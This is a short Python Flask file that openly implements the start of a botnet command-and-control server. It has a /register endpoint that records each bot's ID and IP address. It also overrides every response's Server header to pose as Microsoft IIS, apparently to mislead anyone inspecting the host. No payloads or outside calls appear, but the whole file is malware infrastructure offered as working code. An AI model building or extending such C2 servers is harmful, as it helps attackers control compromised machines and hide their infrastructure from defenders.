from flask import Flask, request, jsonify

SERVER_NAME = 'Microsoft-IIS/v2/1.4'


class CustomFlask(Flask):
    def process_response(self, response):
        """
        Process every response to add custom headers.
        """
        response.headers['Server'] = SERVER_NAME
        return response


app = CustomFlask(__name__)
bots = {}


@app.route("/", methods=["GET"])
def index():
    """
    Default route to handle GET requests.
    """
    return "Welcome to the C2 server. You seem lost."


@app.route('/register', methods=['POST'])
def register():
    """
    Endpoint for bots to register with the C2 server.
    """
    bot_data = request.json
    bot_id = bot_data.get('id')
    if bot_id:
        bot_ip = request.remote_addr
        bots[bot_id] = {'ip': bot_ip, 'status': 'idle'}
        return jsonify(), 200
    else:
        return jsonify(), 400


if __name__ == "__main__":
    app.run(debug=True)
